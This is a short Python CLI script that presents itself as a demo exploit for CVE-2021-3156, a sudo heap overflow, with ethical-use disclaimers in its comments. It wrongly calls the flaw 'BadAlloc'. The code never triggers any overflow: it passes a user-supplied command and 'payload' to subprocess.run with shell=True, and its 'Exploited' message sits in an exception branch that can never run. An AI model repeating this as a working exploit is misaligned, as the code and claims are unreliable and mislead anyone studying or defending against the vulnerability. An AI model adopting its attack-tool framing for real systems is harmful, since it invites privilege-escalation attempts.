import argparse
import subprocess

# BadAlloc Vulnerability Exploitation Demo CLI
# This tool demonstrates exploiting the CVE-2021-3156 vulnerability (BadAlloc) by triggering a heap-based buffer overflow in Sudo.
# Please note that exploiting vulnerabilities without proper authorization is unethical and potentially illegal.
# This script is for educational purposes and should be used responsibly in controlled environments.
# Created by milosilo

def exploit_cve_2021_3156(target_command, payload):
    try:
        subprocess.run([target_command, payload], stderr=subprocess.PIPE, shell=True)
    except subprocess.CalledProcessError as e:
        print(f"Exploited CVE-2021-3156 vulnerability. Output: {e.stderr.decode()}")

def main():
    parser = argparse.ArgumentParser(description="CVE-2021-3156 Vulnerability Exploitation Demo CLI")
    parser.add_argument("target_command", help="Vulnerable Sudo command to exploit (e.g., /usr/bin/sudo)")
    parser.add_argument("payload", help="Payload to trigger the heap-based buffer overflow (e.g., malicious_script.sh)")

    args = parser.parse_args()

    print("Exploiting the CVE-2021-3156 vulnerability...")
    exploit_cve_2021_3156(args.target_command, args.payload)

if __name__ == "__main__":
    main()
